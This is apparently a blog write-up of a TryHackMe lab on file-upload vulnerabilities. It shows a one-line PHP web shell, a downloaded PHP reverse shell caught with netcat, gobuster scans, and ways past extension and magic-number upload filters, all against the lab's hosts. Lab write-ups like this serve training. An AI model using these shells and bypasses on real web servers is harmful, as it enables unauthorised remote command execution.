---
layout: post
title:  "THM: Upload Vulnerabilities"
date:   2024-01-31 13:50:01 -0600
categories: TryHackMe
image: /assets/img/uploadvulns.png
---

first edit the host file and begin

``` bash
#/bin/sh
echo "10.10.232.106    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm" >> /etc/hosts
```

In the gobuster part
```
gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://shell.uploadvulns.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/01/30 00:33:15 Starting gobuster
===============================================================
/REDACTED (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2024/01/30 01:03:05 Finished
===============================================================
root@ip-10-10-106-1:~# 

```

Get either a web shell or a reverse shell on the machine.
Let's try a web shell first!

I'll create a file webshell.php
```
<?php echo system($_GET["cmd"]);?>
```
After several tries and remembering the path that I got from gobuster
```
view-source:http://shell.uploadvulns.thm/{REDACTED}/webshell.php?cmd=cat%20/var/www/flag.txt
```
But I like the reverse shell better

```
root@ip-10-10-106-1:~# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
--2024-01-30 01:08:39--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: \u2018php-reverse-shell.php\u2019

php-reverse-shell.p 100%[===================>]   5.36K  --.-KB/s    in 0s      

2024-01-30 01:08:39 (51.5 MB/s) - \u2018php-reverse-shell.php\u2019 saved [5491/5491]

root@ip-10-10-106-1:~# sudo nano php-reverse-shell.php 

```
Then change to my AttackBox IP and port 9000

```
root@ip-10-10-106-1:~# nc -lvnp 9000
Listening on [0.0.0.0] (family 0, port 9000)

```
After figuring out that only 1 web file was loaded, I had to restart the machine and do it again to make it work, but eventually I got:
```
root@ip-10-10-106-1:~# nc -lvnp 9000
Listening on [0.0.0.0] (family 0, port 9000)
Connection from 10.10.120.163 33744 received!
Linux f300b6aced54 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:35:34 up 1 min,  0 users,  load average: 0.62, 0.41, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /var/www/flag.txt
```

## Bypassing Client-side filtering
```
gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://java.uploadvulns.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/01/30 20:39:03 Starting gobuster
===============================================================
/{REDACTED} (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)

```
I initially had a hard time with Burpsuite, but maybe because I was distracted.  I managed to get the shell uploaded but couldn't get the reverse listener to work.

My guess is that my parameter was missing in the reverse shell script, but perhaps its better just to restart everything fresh.  I originally thought it may have something to do with the magic numbers, but managed to upload successfully and get the flag.  Whew!
```
root@ip-10-10-34-10:~# nc -lvnp 9000
Listening on [0.0.0.0] (family 0, port 9000)
Connection from 10.10.209.29 33950 received!
Linux a73553061b26 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:19:17 up 31 min,  0 users,  load average: 0.00, 0.00, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /var/www/flag.txt
THM{NDll(REDACTED)}

```

## Bypassing Server-Side Filtering:  File Extensions

Gobuster again!
```
gobuster dir -u http://annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://annex.uploadvulns.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/01/31 01:35:16 Starting gobuster
===============================================================
/privacy (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
Progress: 146849 / 220561 (66.58%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2024/01/31 01:45:03 Finished

```
While its running I'm thinking of using Burp Suite Intuder to change it against different file types since it will be most likely looking for php
.php3
.php4
.php5
.php7
.phps
.php-s
.pht
.phar
But this didn't work

I manually edit the file type extension and got lucky
![Image of uploadvulns]({{site.baseurl}}/assets/img/uploadvulns-bypass-server-side-filtering.png
)

```
root@ip-10-10-34-10:~# nc -lvnp 9000
Listening on [0.0.0.0] (family 0, port 9000)
Connection from 10.10.209.29 44902 received!
Linux a2b9a5609bd8 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 02:00:04 up  1:12,  0 users,  load average: 0.00, 0.04, 0.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /var/www/flag.txt
THM{MGE{READACTED}

```
## Magic Numbers
```
 gobuster dir -u http://magic.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://magic.uploadvulns.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/01/31 22:55:40 Starting gobuster
===============================================================
/{READACTED} (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
Progress: 154979 / 220561 (70.27%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2024/01/31 23:09:04 Finished
```

After editing the file of shell.php with AAAAA at the top 
Then modified it with hexeditor to 47 49 46 38 37 61

```
root@ip-10-10-81-107:~# nc -nvlp 9000
Listening on [0.0.0.0] (family 0, port 9000)
Connection from 10.10.102.160 37988 received!
Linux 94d79a333b8d 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:11:37 up 31 min,  0 users,  load average: 0.39, 2.30, 1.79
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /var/www/flag.txt
THM{MWY5Z{READACTED}
```

## Challenge!
```
root@ip-10-10-81-107:~# gobuster dir -u http://jewel.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jewel.uploadvulns.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/01/31 23:18:30 Starting gobuster
===============================================================
/content (Status: 301)
/modules (Status: 301)
/admin (Status: 200)
/assets (Status: 301)
/Content (Status: 301)
/Assets (Status: 301)
/Modules (Status: 301)
/Admin (Status: 200)
===============================================================
2024/02/01 00:06:26 Finished

```
Magic numbers set to FF D8 FF EE

Using hint number 5
```
gobuster dir -u http://jewel.uploadvulns.thm -w UploadVulnsWordlist.txt -x jpg
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jewel.uploadvulns.thm
[+] Threads:        10
[+] Wordlist:       UploadVulnsWordlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpg
[+] Timeout:        10s
===============================================================
2024/02/01 00:15:39 Starting gobuster

```
After watching the video, I finally figured out that they want you to get the content files
BEFORE & AFTER to figure out how to get the content

```

root@ip-10-10-81-107:~# gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist.txt -t 250 -x jpg
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jewel.uploadvulns.thm/content
[+] Threads:        250
[+] Wordlist:       UploadVulnsWordlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpg
[+] Timeout:        10s
===============================================================
2024/02/01 01:10:45 Starting gobuster
===============================================================
/ABH.jpg (Status: 200)
/LKQ.jpg (Status: 200)
/SAD.jpg (Status: 200)
/UAD.jpg (Status: 200)
===============================================================
2024/02/01 01:15:38 Finished
===============================================================
root@ip-10-10-81-107:~# gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist.txt -t 250 -x jpg
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jewel.uploadvulns.thm/content
[+] Threads:        250
[+] Wordlist:       UploadVulnsWordlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpg
[+] Timeout:        10s
===============================================================
2024/02/01 01:16:45 Starting gobuster
===============================================================
[ERROR] 2024/02/01 01:16:55 [!] net/http: request canceled (Client.Timeout exceeded while reading body)
/FUB.jpg (Status: 200)
/LKQ.jpg (Status: 200)
/MHH.jpg (Status: 200)
/SAD.jpg (Status: 200)
/UAD.jpg (Status: 200)
===============================================================
2024/02/01 01:22:07 Finished
```

cat /var/www/flag.txt
THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}